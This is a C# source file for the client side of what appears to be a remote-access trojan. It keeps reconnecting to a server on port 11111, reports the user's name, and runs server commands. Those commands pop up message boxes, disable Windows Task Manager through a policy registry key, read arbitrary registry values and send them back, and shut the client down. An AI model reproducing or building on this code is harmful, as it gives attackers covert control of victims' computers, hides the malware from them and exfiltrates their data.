using System.Net;
using System.Net.Sockets;
using System.Text;
using Microsoft.Win32;

namespace Client.Client
{
    internal class SocketClient
    {
        bool 
            bShouldRun = true,
            bNameSent = false;
        private Socket serverSocket;

        public Socket GetServerSocket()
        {
            return serverSocket;
        }

        private bool SendName()
        {
            GetServerSocket().Send(Encoding.ASCII.GetBytes("<CMD=NAME>" + WindowsHelper.GetUsername() + "<EOF>"));
            return true;
        }

        private void ParseData(string data)
        {
            string tempString = data.Replace("<EOF>", "");

            if (tempString.StartsWith("<CMD=MSGBOX>"))
            {
                tempString = tempString.Replace("<CMD=MSGBOX>", "");
                Main.uiRequests.Request(tempString, RequestUI.RequestType.UI_SHOW_MESSAGEBOX);
            }
            else if(tempString.StartsWith("<PING>"))
            {
                GetServerSocket().Send(Encoding.ASCII.GetBytes(tempString));
            }
            else if(tempString.StartsWith("<SET-TASKMGR>"))
            {
                string value = tempString.Split(">")[1];
                const string keyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
                WindowsHelper.WriteRegistryKey(keyPath, RegistryValueKind.DWord, "DisableTaskMgr", value, true);
            }
            else if(tempString.StartsWith("<GET-REGKEY>"))
            {
                tempString = tempString.Replace("<GET-REGKEY>", "");
                string[] split = tempString.Split("<SPLIT>");
                string returnString = WindowsHelper.ReadRegistryKey(split[0], split[1]);
                GetServerSocket().Send(Encoding.ASCII.GetBytes("<GET-REGKEY>" + returnString));
            }
            else if(tempString.StartsWith("<SHUTDOWN-CLIENT>"))
            {
                bShouldRun = false;
                GetServerSocket().Disconnect(false);
                GetServerSocket().Close();
                Application.Exit();
            }
        }

        public void ExecuteClient()
        {
            while (bShouldRun)
            {
                try
                {
                    // Connect to server, currently localhost and port 11111.
                    IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                    IPAddress ipAddress = ipHost.AddressList[0];
                    IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 11111);

                    // TCP/IP Socket.
                    serverSocket = new(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                    // Connect to server.
                    GetServerSocket().Connect(localEndPoint);

                    if (!bNameSent)
                        bNameSent = SendName();
                    try
                    {
                        while (GetServerSocket().Connected)
                        {
                            // Data buffer
                            byte[] messageReceived = new byte[1024];
                            int byteRecv = serverSocket.Receive(messageReceived);
                            ParseData(Encoding.ASCII.GetString(messageReceived, 0, byteRecv));
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }

                    if (!GetServerSocket().Connected)
                        bNameSent = false;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }
    }
}
